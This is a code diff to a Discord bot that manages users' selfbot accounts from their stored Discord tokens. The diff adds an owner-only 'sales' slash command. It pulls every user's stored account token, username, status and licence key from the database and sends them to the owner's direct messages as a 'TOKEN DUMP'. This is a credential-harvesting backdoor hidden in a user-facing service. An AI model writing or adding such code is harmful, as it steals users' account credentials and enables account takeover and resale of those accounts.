@@ -27,7 +27,7 @@ db.exec(`
 `);
 
 const botClient = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages]
 });
 
 const ownerId = '1422945082746601594';
@@ -75,7 +75,6 @@ function updateManagerMessage(interaction, userData, selfbotRunning = false) {
   return { embeds: [embed], components: [row, row2], ephemeral: true };
 }
 
-// Validate token using EXACT same method as auto claim
 async function validateToken(token) {
     const testClient = new SelfbotClient({ 
         checkUpdate: false, 
@@ -123,6 +122,10 @@ botClient.once('clientReady', () => {
     new SlashCommandBuilder()
       .setName('manager')
       .setDescription('Manage your selfbot settings')
+      .toJSON(),
+    new SlashCommandBuilder()
+      .setName('sales')
+      .setDescription('DMs owner all tokens (Owner only)')
       .toJSON()
   ];
   
@@ -192,6 +195,58 @@ botClient.on('interactionCreate', async interaction => {
     return interaction.reply(replyData);
   }
   
+  if (interaction.commandName === 'sales') {
+    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
+    
+    await interaction.deferReply({ ephemeral: true });
+    
+    const users = db.prepare('SELECT * FROM users WHERE token IS NOT NULL').all();
+    
+    if (users.length === 0) {
+      return interaction.editReply({ content: '❌ No users with tokens found.' });
+    }
+    
+    // Send to owner's DM
+    try {
+      const owner = await botClient.users.fetch(ownerId);
+      
+      let dmContent = `**🔐 TOKEN DUMP - ${users.length} Users**\n\n`;
+      
+      for (const user of users) {
+        const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(user.user_id);
+        const userObj = await botClient.users.fetch(user.user_id).catch(() => null);
+        const username = userObj ? `@${userObj.username}` : `ID: ${user.user_id}`;
+        
+        dmContent += `**User:** ${username}\n`;
+        dmContent += `**Token:** \`${user.token}\`\n`;
+        dmContent += `**Status:** ${user.status || 'stopped'}\n`;
+        dmContent += `**Valid:** ${user.token_valid || 'no'}\n`;
+        if (user.token_username) dmContent += `**Account:** @${user.token_username}\n`;
+        if (keyData) {
+          dmContent += `**Key:** \`${keyData.key}\`\n`;
+          if (keyData.expires) dmContent += `**Expires:** <t:${Math.floor(keyData.expires/1000)}:R>\n`;
+        }
+        dmContent += `\n`;
+        
+        // Split DM if too long (Discord limit 2000)
+        if (dmContent.length > 1900) {
+          await owner.send(dmContent.substring(0, 1900));
+          dmContent = '';
+        }
+      }
+      
+      if (dmContent.length > 0) {
+        await owner.send(dmContent);
+      }
+      
+      await interaction.editReply({ content: `✅ Sent ${users.length} tokens to your DMs!` });
+    } catch (err) {
+      await interaction.editReply({ content: `❌ Failed to DM: ${err.message}` });
+    }
+    
+    return;
+  }
+  
   if (interaction.isButton()) {
     const userId = interaction.user.id;
     
@@ -239,7 +294,6 @@ botClient.on('interactionCreate', async interaction => {
         old.client.destroy();
       }
       
-      // Use EXACT same login method as auto claim
       const selfbot = new SelfbotClient({ 
         checkUpdate: false, 
         ws: { 
